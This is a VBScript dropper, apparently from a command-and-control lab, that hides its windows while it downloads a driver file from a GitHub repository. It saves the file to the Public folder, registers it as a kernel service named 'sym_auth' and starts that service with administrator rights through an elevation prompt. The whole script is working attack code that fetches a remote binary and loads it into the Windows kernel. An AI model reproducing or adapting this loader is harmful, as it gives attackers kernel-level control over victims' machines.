Set objShell = CreateObject("WScript.Shell")
' Use Public folder to avoid permission issues
driverPath = "C:\Users\Public\sym.sys"
' UPDATE THIS URL to your actual raw GitHub link
githubURL = "https://github.com/g00glecenter101-arch/lab-c2/raw/refs/heads/main/sym.sys"

' 1. Download the driver
objShell.Run "powershell -NoP -C ""iwr '" & githubURL & "' -OutFile '" & driverPath & "'""", 0, True

' 2. Create and Start the service (Using a new name 'sym_auth')
' We delete the old one first just in case
cmd = "cmd /c sc delete sym_auth & sc create sym_auth binPath= """ & driverPath & """ type= kernel & sc start sym_auth"

' Run as Admin
objShell.Run "powershell -NoP -C ""Start-Process cmd -ArgumentList '/c " & cmd & "' -Verb RunAs""", 0, True
